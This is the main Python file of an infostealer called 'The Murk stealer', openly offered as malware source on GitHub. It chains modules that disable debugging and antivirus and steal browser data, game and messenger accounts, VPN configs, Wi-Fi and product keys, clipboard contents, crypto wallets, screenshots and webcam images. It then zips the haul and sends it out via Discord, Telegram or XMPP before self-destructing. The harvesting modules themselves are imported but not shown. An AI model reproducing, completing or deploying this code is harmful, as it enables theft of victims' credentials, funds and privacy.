#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from manager import make_folder
from system import system_info
from system import programs
from system import photos
from games import Minecraft
from messengers import telegram
from manager import send 
from manager import clear
from games import steam
from messengers import discord
from games import epicGames
from messengers import whatsapp
from games import roblox
from wallets import wallets
from messengers import skype
from games import BattleNET
from games import Uplay
from config.config import Config
from manager import ending
from messengers import viber
from browsers import chromium
from files import Files_txt
from files import file_grubber
from secure import antiDebug
from files import filezilla
from vpn import vpn
from messengers import pidgin
from system import productkey
from system import wifi
from system import clipboard
from browsers import geckodriver

def Start() -> None:
    if not Config.debuging:
        antiDebug.AntiDebug(Config.oneStart,Config.avKiller)
    make_folder.makeFolders(Config.enableFileGrubber,Config.oneStart)
def GrubFiles() -> None:
    if Config.enableFileGrubber:
        Config.msgFiles= file_grubber.Grab(Config.msgFiles)
    else:
        Files_txt.TxtSteal()
    filezilla.FileZilla()

def Browsers() -> None:
    Config.msgBrowsers.append("\n\n<b>🌐Browsers🌐</b>")
    chromium.Browsers()
    Config.msgBrowsers = chromium.Browsers.Return()
    Config.msgBrowsers = geckodriver.GeckoDriver(Config.msgBrowsers)

def Games() -> None:
    Config.msgOther.append("\n\n<b>🕹Games🕹</b>")
    Config.msgOther = epicGames.Epic(Config.msgOther)
    Config.msgOther = Uplay.Ubisoft(Config.msgOther)
    Config.msgOther = Minecraft.Minecraft(Config.msgOther)
    Config.msgOther = roblox.roblox(Config.msgOther)
    Config.msgOther = steam.Steam(Config.msgOther)
    Config.msgOther =BattleNET.BattleNet(Config.msgOther)

def Messagers() -> None:
    Config.msgOther.append("\n\n<b>📬Messagers📬</b>")
    Config.msgOther = skype.skype(Config.msgOther)
    Config.msgOther = telegram.Telegram(Config.msgOther)
    Config.msgOther = viber.Viber(Config.msgOther)
    Config.msgOther = discord.Discord(Config.msgOther)
    Config.msgOther = whatsapp.WhatsApp(Config.msgOther)
    Config.msgOther = pidgin.Pidgin(Config.msgOther)

def VPN() -> None:
    Config.msgVPN= vpn.VPN(Config.msgVPN)

def System() -> None:
    Config.msgSYS = system_info.SystemInfo(Config.msgSYS)
    productkey.PKay()
    wifi.Wifi()
    clipboard.ClipBoard()


def Other() -> None:
    Config.msgWallets = wallets.Wallets(Config.msgWallets)
    programs.Programs()
    photos.Screenshot()
    photos.WebCam()

def End() -> None:
    try:
        Config.np = clear.makemeZip(Config.name,Config.password,Config.np)
    except Exception as e:
        print(e)
    try:
        send.Send(Config.sendType,Config.np,Config.msgSYS,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
    except Exception as e:
        print(e)
    ending.End(Config.np, Config.selfDestruct)

def Main()-> None:
    Start()
    GrubFiles()
    Browsers()
    Games()
    Messagers()
    VPN()
    System()
    Other()
    End()

